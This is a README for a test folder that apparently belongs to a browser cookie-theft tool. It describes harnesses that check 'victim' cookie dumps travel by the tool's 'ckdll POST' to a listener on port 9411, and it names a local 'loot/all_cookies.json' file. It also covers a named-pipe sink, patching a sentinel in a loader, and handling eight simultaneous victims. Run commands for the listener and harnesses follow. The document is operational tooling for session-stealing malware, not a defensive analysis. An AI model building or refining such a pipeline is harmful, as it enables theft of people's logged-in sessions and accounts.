# tests

Harnesses built on the test machine. They talk to the real ingest pipeline over
real sockets, no mocks. Run from this directory.

| file | what it proves | needs |
|------|----------------|-------|
| `ck_t_a.py` | wire format fidelity: Host with port, `X-CookieLog-Host`, `Connection: close`, bad JSON, 40 MB body -> 413, UTF-8, dedupe on resend | `listen.py` on 9411 |
| `ck_t_b.py` | a real victim dump travels the exact ckdll POST and arrives byte-identical; v20 ciphertext preserved as empty | `listen.py` on 9411 + a local `loot/all_cookies.json` |
| `ck_t_c.py` | `sink.py` over the real named pipe `\\.\pipe\ck_pipe` | `sink.py` running |
| `ck_t_e.py` | `peutil.find_sentinel()` patches the array, not the `memcmp` twin, using the loader stored in git | git history |
| `ck_t_f.py` | 8 simultaneous victims, no record loss, plus the Firefox container swap | `listen.py` on 9411 |

```
python -u listen.py 9411     # in another window
python tests\ck_t_a.py
python tests\ck_t_b.py
python tests\ck_t_f.py
```

Each harness prints `PASS`/`FAIL` per case and a `=== N falhas ===` line; the exit
code is non-zero when N is not zero.
